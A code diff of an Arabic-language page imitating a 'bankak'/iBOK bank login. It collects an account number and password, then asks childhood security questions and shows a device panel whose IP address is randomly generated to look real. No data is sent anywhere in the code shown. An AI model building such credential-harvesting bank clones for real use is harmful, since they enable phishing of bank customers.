@@ -281,7 +281,7 @@
 
         .security-header {
             text-align: center;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
         .security-header h1 {
@@ -329,19 +329,57 @@
             color: #333;
         }
 
-        .security-card .question {
+        .security-card .device-info .ip {
+            font-size: 12px;
+            color: #999;
+            margin-top: 4px;
+        }
+
+        .security-card .warning-box {
+            background: #fff5f5;
+            border-radius: 12px;
+            padding: 16px;
+            border: 1px solid #ffe0e0;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .security-card .warning-box .title {
+            font-weight: 700;
+            color: #c1121f;
+            font-size: 15px;
+        }
+
+        .security-card .warning-box .desc {
+            font-size: 13px;
+            color: #555;
+            margin-top: 6px;
+        }
+
+        .security-card .question-label {
             font-size: 15px;
             font-weight: 600;
             color: #333;
             margin: 16px 0 8px;
         }
 
-        .security-card .question small {
+        .security-card .question-label small {
             font-weight: 400;
             color: #888;
             font-size: 12px;
             display: block;
             margin-top: 4px;
+        }
+
+        .security-card .question-box {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 12px;
+            text-align: center;
+            font-weight: 600;
+            color: #333;
+            font-size: 16px;
         }
 
         .security-card input {
@@ -353,6 +391,7 @@
             font-family: 'Cairo', sans-serif;
             background: #fafafa;
             margin-bottom: 16px;
+            text-align: right;
         }
 
         .security-card input:focus {
@@ -406,6 +445,15 @@
 
         .btn-security:hover {
             background: #c1121f;
+        }
+
+        .btn-next {
+            background: #0a66c2;
+            color: white;
+        }
+
+        .btn-next:hover {
+            background: #004182;
         }
 
         .security-share {
@@ -530,6 +578,7 @@
             .overlay .loading-spinner { width: 50px; height: 50px; }
             .security-actions button { font-size: 12px; padding: 10px; min-width: 80px; }
             .security-header h1 { font-size: 24px; }
+            .security-card .question-box { font-size: 14px; }
         }
     </style>
 </head>
@@ -606,42 +655,39 @@
     <div id="securityPage">
         <div class="security-header">
             <h1>🔐 بنك bankak</h1>
-            <div class="sub">ادخل رقم المعرف (رقم الحساب أو 249-رقم الموديل)</div>
+            <div class="sub">استلمة الأمان</div>
         </div>
 
         <div class="security-card">
+            <!-- معلومات الجهاز -->
             <div class="device-info">
                 <i class="fas fa-mobile-alt"></i>
                 <div class="label">الجهاز المستخدم</div>
-                <div class="value">Samsung Galaxy A52</div>
-                <div style="font-size:12px; color:#999; margin-top:4px;">IP: 192.168.1.1</div>
+                <div class="value" id="deviceName">Samsung Galaxy A52</div>
+                <div class="ip" id="deviceIP">IP: 192.168.1.1</div>
             </div>
 
-            <div style="background: #fff5f5; border-radius: 12px; padding: 16px; border: 1px solid #ffe0e0; margin-bottom: 16px;">
-                <div style="font-weight: 700; color: #c1121f; font-size: 15px;">
-                    ⚠️ ترغب في إستخدام موبايل مختلف؟
-                </div>
-                <div style="font-size: 13px; color: #555; margin-top: 6px;">
-                    اذا كنت تحاول الدخول من جهاز موبايل مختلف (غير الموبايل المسجل) أضغط على زر اعادة التعيين واتبع التعليمات
-                </div>
+            <!-- تحذير جهاز مختلف -->
+            <div class="warning-box">
+                <div class="title">⚠️ ترغب في إستخدام موبايل مختلف؟</div>
+                <div class="desc">اذا كنت تحاول الدخول من جهاز موبايل مختلف (غير الموبايل المسجل) أضغط على زر إعادة التعيين واتبع التعليمات</div>
             </div>
 
             <!-- سؤال الأمان -->
-            <div class="question">
+            <div class="question-label">
                 📝 الإجابة على أسئلة الأماكن
                 <small>اختر الإجابة الصحيحة للسؤال التالي:</small>
             </div>
 
-            <div style="background: #f8f9fa; border-radius: 8px; padding: 12px; margin-bottom: 12px;">
-                <p style="font-weight: 600; color: #333;">ما هو اسم الشارع الذي كنت تعيش فيه عندما كنت طفلاً؟</p>
-            </div>
+            <div class="question-box" id="questionText">ما هو اسم الشارع الذي كنت تعيش فيه عندما كنت طفلاً؟</div>
 
-            <input type="text" id="securityAnswer" placeholder="أدخل الإجابة..." />
+            <input type="text" id="securityAnswer" placeholder="أدخل الجواب" />
 
             <div class="security-actions">
                 <button class="btn-cancel" onclick="cancelSecurity()">إلغاء</button>
                 <button class="btn-atm" onclick="atmAuth()">باستخدام بطاقة الصراف الآلي</button>
-                <button class="btn-security" onclick="verifySecurity()">التحقق</button>
+                <button class="btn-next" onclick="nextQuestion()">سؤال آخر</button>
+                <button class="btn-security" onclick="verifySecurity()">إرسال</button>
             </div>
 
             <div class="security-share">
@@ -683,6 +729,117 @@
     </div>
 
     <script>
+        // ===== الأسئلة =====
+        const securityQuestions = [
+            "ما هو اسم الشارع الذي كنت تعيش فيه عندما كنت طفلاً؟",
+            "ما هو اسم المدرسة التي التحقت بها؟",
+            "اسم فريق كرة القدم المفضل لديك؟",
+            "اسم الشركة المصنعة للسيارة المفضلة لديك؟",
+            "اسم أفضل صديق في الطفولة؟",
+            "في أي مدينة ولدت؟"
+        ];
+
+        let currentQuestionIndex = 0;
+
+        // ===== تحديد نوع الجهاز =====
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceName = "جهاز غير معروف";
+            let ip = "IP: غير متاح";
+
+            // تحديد نوع الجهاز
+            if (/android/i.test(userAgent)) {
+                const match = userAgent.match(/SM-[A-Z0-9]+/);
+                if (match) {
+                    deviceName = match[0];
+                } else {
+                    deviceName = "هاتف Android";
+                }
+            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                deviceName = "iPhone/iPad";
+            } else if (/Windows/i.test(userAgent)) {
+                deviceName = "جهاز Windows";
+            } else if (/Macintosh/i.test(userAgent)) {
+                deviceName = "جهاز Mac";
+            } else {
+                deviceName = "جهاز غير معروف";
+            }
+
+            // محاكاة IP (لأن IP الحقيقي لا يمكن الحصول عليه من المتصفح)
+            const ipParts = [];
+            for (let i = 0; i < 4; i++) {
+                ipParts.push(Math.floor(Math.random() * 255));
+            }
+            ip = `IP: ${ipParts.join('.')}`;
+
+            return { deviceName, ip };
+        }
+
+        // ===== تحديث معلومات الجهاز =====
+        function updateDeviceInfo() {
+            const info = getDeviceInfo();
+            document.getElementById('deviceName').textContent = info.deviceName;
+            document.getElementById('deviceIP').textContent = info.ip;
+        }
+
+        // ===== تحديث السؤال =====
+        function updateQuestion() {
+            document.getElementById('questionText').textContent = securityQuestions[currentQuestionIndex];
+            document.getElementById('securityAnswer').value = '';
+            document.getElementById('securityAnswer').focus();
+        }
+
+        // ===== السؤال التالي =====
+        function nextQuestion() {
+            currentQuestionIndex = (currentQuestionIndex + 1) % securityQuestions.length;
+            updateQuestion();
+        }
+
+        // ===== التحقق =====
+        function verifySecurity() {
+            const answer = document.getElementById('securityAnswer').value.trim();
+            if (answer === '') {
+                alert('الرجاء إدخال الإجابة على سؤال الأمان');
+                return;
+            }
+            alert('✅ تم التحقق بنجاح!');
+            // هنا يمكن التوجه للوحة التحكم
+        }
+
+        // ===== إلغاء =====
+        function cancelSecurity() {
+            if (confirm('هل أنت متأكد من إلغاء عملية التحقق؟')) {
+                document.getElementById('securityPage').style.display = 'none';
+                document.getElementById('loginPage').style.display = 'block';
+                document.getElementById('footer').style.marginTop = '30px';
+                document.getElementById('accountNumber').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('securityAnswer').value = '';
+            }
+        }
+
+        // ===== صراف آلي =====
+        function atmAuth() {
+            alert('🔑 سيتم إرسال رمز إلى بطاقة الصراف الآلي الخاصة بك.');
+        }
+
+        // ===== مشاركة رمز =====
+        function shareCode() {
+            const code = Math.floor(100000 + Math.random() * 900000);
+            if (navigator.share) {
+                navigator.share({
+                    title: 'رمز التحقق - iBOK',
+                    text: `رمز التحقق الخاص بك هو: ${code}`
+                }).catch(() => {});
+            } else {
+                navigator.clipboard.writeText(`رمز التحقق الخاص بك هو: ${code}`).then(() => {
+                    alert('✅ تم نسخ رمز التحقق: ' + code);
+                }).catch(() => {
+                    alert('رمز التحقق الخاص بك هو: ' + code);
+                });
+            }
+        }
+
         // ===== إظهار/إخفاء كلمة المرور =====
         function togglePassword() {
             const input = document.getElementById('password');
@@ -719,50 +876,6 @@
             document.getElementById('errorMessageSimple').classList.remove('active');
         }
 
-        // ===== التحقق الأمني =====
-        function verifySecurity() {
-            const answer = document.getElementById('securityAnswer').value.trim();
-            if (answer === '') {
-                alert('الرجاء إدخال الإجابة على سؤال الأمان');
-                return;
-            }
-            // محاكاة التحقق
-            alert('✅ تم التحقق بنجاح!\nمرحباً بك في حسابك.');
-            // هنا يمكن التوجه للوحة التحكم
-            // window.location.href = 'dashboard.html';
-        }
-
-        function cancelSecurity() {
-            if (confirm('هل أنت متأكد من إلغاء عملية التحقق؟')) {
-                document.getElementById('securityPage').style.display = 'none';
-                document.getElementById('loginPage').style.display = 'block';
-                document.getElementById('footer').style.marginTop = '30px';
-                document.getElementById('accountNumber').value = '';
-                document.getElementById('password').value = '';
-                document.getElementById('securityAnswer').value = '';
-            }
-        }
-
-        function atmAuth() {
-            alert('🔑 سيتم إرسال رمز إلى بطاقة الصراف الآلي الخاصة بك.');
-        }
-
-        function shareCode() {
-            const code = Math.floor(100000 + Math.random() * 900000);
-            if (navigator.share) {
-                navigator.share({
-                    title: 'رمز التحقق - iBOK',
-                    text: `رمز التحقق الخاص بك هو: ${code}`
-                }).catch(() => {});
-            } else {
-                navigator.clipboard.writeText(`رمز التحقق الخاص بك هو: ${code}`).then(() => {
-                    alert('✅ تم نسخ رمز التحقق: ' + code);
-                }).catch(() => {
-                    alert('رمز التحقق الخاص بك هو: ' + code);
-                });
-            }
-        }
-
         // ===== تسجيل الدخول =====
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -772,13 +885,11 @@
 
             clearMessages();
 
-            // التحقق من رقم الحساب (7 أرقام)
             if (!/^\d{7}$/.test(acc)) {
                 showError('رقم الحساب غير صحيح.\nالرجاء إدخال 7 أرقام فقط (مثال: 1234567)');
                 return;
             }
 
-            // التحقق من كلمة المرور
             const errors = [];
             if (pass.length < 8) errors.push('• 8 أحرف على الأقل');
             if (!/[A-Z]/.test(pass)) errors.push('• حرف كبير (A-Z)');
@@ -791,31 +902,34 @@
                 return;
             }
 
-            // ✅ جميع الشروط صحيحة → إظهار الـ Overlay
             showOverlay();
 
-            // محاكاة عملية تسجيل الدخول (2 ثانية)
             setTimeout(function() {
                 hideOverlay();
-                // إخفاء صفحة تسجيل الدخول وإظهار صفحة التحقق الأمني
                 document.getElementById('loginPage').style.display = 'none';
                 document.getElementById('securityPage').style.display = 'block';
                 document.getElementById('footer').style.marginTop = '0';
+                
+                // تحديث معلومات الجهاز
+                updateDeviceInfo();
+                
+                // تعيين أول سؤال
+                currentQuestionIndex = 0;
+                updateQuestion();
             }, 2000);
         });
 
-        // ===== منع إدخال غير أرقام في حقل رقم الحساب =====
+        // ===== منع إدخال غير أرقام =====
         document.getElementById('accountNumber').addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '');
             clearMessages();
         });
 
-        // ===== مسح الرسائل عند الكتابة في كلمة المرور =====
         document.getElementById('password').addEventListener('input', function() {
             clearMessages();
         });
 
-        // ===== السماح بدخول Enter في حقل الإجابة الأمنية =====
+        // ===== السماح بدخول Enter =====
         document.getElementById('securityAnswer').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 verifySecurity();
